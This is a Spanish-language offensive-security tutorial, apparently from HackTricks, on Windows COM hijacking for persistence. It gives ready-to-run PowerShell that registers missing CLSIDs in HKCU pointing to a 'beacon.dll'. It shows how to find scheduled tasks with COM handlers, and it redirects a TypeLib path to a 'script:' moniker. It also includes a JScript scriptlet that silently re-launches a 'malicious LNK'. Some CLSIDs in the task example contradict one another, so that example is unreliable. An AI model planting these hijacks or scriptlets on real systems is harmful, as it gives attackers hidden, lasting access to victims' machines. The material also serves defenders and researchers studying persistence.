# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Buscando componentes COM inexistentes

Como los valores de HKCU pueden ser modificados por los usuarios, **COM Hijacking** podría usarse como un **mecanismo persistente**. Usando `procmon` es fácil encontrar entradas de registro COM buscadas que no existen y que un atacante podría crear para persistir. Filtros:

- operaciones **RegOpenKey**.
- donde el _Result_ es **NAME NOT FOUND**.
- y el _Path_ termina con **InprocServer32**.

Una vez que hayas decidido qué COM inexistente suplantar, ejecuta los siguientes comandos. _Ten cuidado si decides suplantar un COM que se carga cada pocos segundos, ya que podría ser excesivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM del Task Scheduler que se pueden secuestrar

Windows Tasks usan Custom Triggers para invocar objetos COM y, dado que se ejecutan a través del Task Scheduler, es más fácil predecir cuándo se van a activar.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Al revisar la salida puedes seleccionar uno que se ejecutará, por ejemplo, **cada vez que un usuario inicie sesión**.

Ahora, buscando el CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** en **HKEY\CLASSES\ROOT\CLSID** y en HKLM y HKCU, normalmente encontrarás que el valor no existe en HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Entonces, simplemente puedes crear la entrada en HKCU y cada vez que el usuario inicie sesión, tu backdoor se ejecutará.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definen interfaces COM y se cargan mediante `LoadTypeLib()`. Cuando se instancia un servidor COM, el OS también puede cargar el TypeLib asociado consultando las claves del registro bajo `HKCR\TypeLib\{LIBID}`. Si la ruta del TypeLib se reemplaza por un **moniker**, p. ej. `script:C:\...\evil.sct`, Windows ejecutará el scriptlet cuando se resuelva el TypeLib, lo que permite una persistencia sigilosa que se activa cuando se usan componentes comunes.

Esto se ha observado contra el Microsoft Web Browser control (frecuentemente cargado por Internet Explorer, apps que incrustan WebBrowser, e incluso `explorer.exe`).

### Pasos (PowerShell)

1) Identifica el TypeLib (LIBID) usado por un CLSID de uso frecuente. Ejemplo de CLSID a menudo abusado por cadenas de malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Apunte la ruta TypeLib por usuario a un scriptlet local usando el moniker `script:` (no se requieren admin rights):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Coloca un `.sct` mínimo en JScript que vuelva a ejecutar tu payload principal (p. ej. un `.lnk` usado por la cadena inicial):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Activación – abrir IE, una aplicación que incrusta el control WebBrowser, o incluso la actividad rutinaria de Explorer cargará el TypeLib y ejecutará el scriptlet, rearmando tu chain en logon/reboot.

Limpieza
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notas
- Puedes aplicar la misma lógica a otros componentes COM de alta frecuencia; siempre resuelve el real `LIBID` desde `HKCR\CLSID\{CLSID}\TypeLib` primero.
- En sistemas de 64 bits también puedes poblar la subclave `win64` para consumidores de 64 bits.

## Referencias

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
